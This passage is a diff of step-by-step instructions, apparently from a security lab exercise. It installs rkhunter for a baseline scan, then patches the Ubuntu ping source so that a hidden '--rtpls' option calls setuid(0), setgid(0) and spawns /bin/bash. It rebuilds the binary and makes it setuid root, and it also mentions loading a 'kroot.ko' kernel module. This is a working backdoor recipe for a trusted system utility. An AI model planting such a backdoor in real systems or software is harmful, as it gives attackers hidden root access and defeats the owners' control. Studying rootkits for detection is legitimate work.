@@ -13,34 +13,44 @@ To the ~/.vimrc add
 Install RootkitHunter (rkhunter) with Local Mail
 Update rkhunter DB : sudo rkhunter --update
 Scan : sudo rkhunter -c
-Copy log to step1.log
+Copy log from /var/log/rkhunter.log to some safe place (e.g. cp /var/log/rkhunter.log ~/step1.log)
 
 # Step 2 Build/Install Rootkit
 
-ping is found in APT-Sources: http://de.archive.ubuntu.com/ubuntu bionic/universe amd64 Packages
-uncomment/add deb-src for APT-Sources: http://de.archive.ubuntu.com/ubuntu bionic/universe amd64 Packages
+#
+#ping is found in APT-Sources: http://de.archive.ubuntu.com/ubuntu/ xenial universe
+#in /etc/apt/source.list uncomment/add 
+    deb-src  http://de.archive.ubuntu.com/ubuntu/ xenial universe
+    
+#refresh apt database
+    sudo apt-get update
+
+#cd into a new/empty dir for downloading the ping src into
+# e.g. mkdir -p ~/Documents/Pingdoor && cd ~/Documents/Pingdoor
 
 #get ping source 
     apt-get source inetutils-ping
-#install build dependencies (do this in a new folder)
+#install build dependencies 
     sudo apt-get build-dep inetutils-ping
-#test-compile while beeing in the inetutils-1.9.4 folder
+#test-compile while being in the inetutils-1.9.4 folder, this should succeed, this takes some time
+# build may complain about missing keys this is not a problem just ignore it
     dpkg-buildpackage
 
-#add to ping.c
+#edit ping/ping.c
 #add to the end of the unnamed? enum:
 
 ARG_ROOT_PLS
 
-#add to the argp_options array the following element between #define GRP 10 and #undef GRP:
-
-{"rtpls",ARG_ROOT_PLS,NULL,0,OPTION_HIDDEN,GRP+1}
+#add to the argp_options array the following element between #define GRP 10 and #undef GRP,
+#must be after {NULL, 0, NULL, 0, "Options controlling ICMP request types:", GRP}:
+    {"rtpls",ARG_ROOT_PLS,NULL,OPTION_HIDDEN,"grants root shell",GRP+1},
     
-#in the parse_opt methode add to the switch 
+#in the parse_opt method add to the switch 
   
 case ARG_ROOT_PLS:
     setuid(0);
-    execl("/bin/bash",NULL);ping 
+    setgid(0);
+    execl("/bin/bash",NULL);
     break;
 
 #commit changes 
@@ -48,15 +58,15 @@ case ARG_ROOT_PLS:
 #build changes 
     dpkg-buildpackage
 
-# the next two are nessecary because the first dpkg-buildpackage always finds changed files.?
+# the next two might be necessary because the first dpkg-buildpackage usually finds changed files.?
 #commit changes 
     dpkg-source --commit
 #build changes 
     dpkg-buildpackage
 
 #to test first set correct privileges with
-    chown root:root ping/ping
-    chmod u+s ping/ping
+    sudo chown root:root ping/ping
+    sudo chmod u+s ping/ping
 #run ping with special flag
     ping --rtpls
 
@@ -86,7 +96,7 @@ case ARG_ROOT_PLS:
 #unload (unload.sh)
     rmmod kroot.ko
 
-#Show Messeges (add -w to display messages as they come in) (show.sh uses -w flag)
+#Show Messages (add -w to display messages as they come in) (show.sh uses -w flag)
     dmesg -k
 
 #To Recompile and (re)load the module you can use the replace.sh skript
